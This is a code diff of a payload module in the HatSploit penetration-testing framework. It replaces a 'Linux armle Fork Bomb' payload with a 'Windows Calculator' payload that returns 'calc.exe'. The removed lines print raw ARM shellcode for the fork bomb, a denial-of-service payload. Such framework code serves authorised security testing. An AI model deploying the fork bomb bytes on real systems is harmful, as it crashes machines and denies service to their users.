@@ -10,20 +10,19 @@ from hatsploit.lib.payload import Payload
 
 class HatSploitPayload(Payload):
     details = {
-        'Name': "Linux armle Fork Bomb",
-        'Payload': "linux/armle/fork_bomb",
+        'Name': "Windows Calculator",
+        'Payload': "windows/cmd/calc",
         'Authors': [
             'Ivan Nikolsky (enty8080) - payload developer'
         ],
-        'Description': "Fork bomb payload for Linux armle.",
-        'Architecture': "armle",
-        'Platform': "linux",
-        'Rank': "low",
+        'Description': "Windows calc.exe payload.",
+        'Architecture': "cmd",
+        'Platform': "windows",
+        'Rank': "high",
         'Type': "one_side"
     }
 
     def run(self):
-        return (
-            b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x7f\x40"
-            b"\x02\x27\x01\xdf\xc0\x46\xff\xf7\xfa\xff"
-        )
+        payload = "calc.exe"
+
+        return payload
